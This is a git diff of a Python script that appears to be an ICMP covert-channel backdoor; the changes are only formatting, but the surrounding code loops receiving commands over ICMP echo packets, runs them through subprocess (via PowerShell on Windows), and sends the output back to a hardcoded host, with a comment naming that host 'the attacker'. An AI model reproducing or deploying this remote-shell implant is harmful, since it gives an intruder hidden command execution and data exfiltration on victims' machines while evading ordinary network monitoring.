@@ -5,8 +5,8 @@ from os import name as OS_NAME
 
 SENDER_IP = "10.0.1.1"
 RECEIVER_IP = "10.0.1.2"
-sender = ICMPEchoFullPayload(ip_dst = SENDER_IP)
-receiver = ICMPEchoFullPayload(ip_dst = RECEIVER_IP)
+sender = ICMPEchoFullPayload(ip_dst=SENDER_IP)
+receiver = ICMPEchoFullPayload(ip_dst=RECEIVER_IP)
 
 # Indicate we are ready to receive input
 print()
@@ -31,12 +31,13 @@ while True:
                 exit()
             # Run with Powershell for windows systems
             if OS_NAME == "nt":
-                command.insert(0, "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe")
+                command.insert(0, "C:\\Windows\\System32\\Windows\
+Powershell\\v1.0\\powershell.exe")
         # Handle oddity of an Attribute Error by just continuing
         except AttributeError:
             continue
         # Run the command we received
-        response = run(command, capture_output = True, text = True).stdout
+        response = run(command, capture_output=True, text=True).stdout
         # Send the response to the attacker
         sender.ingest(response)
         sender.send_packets()
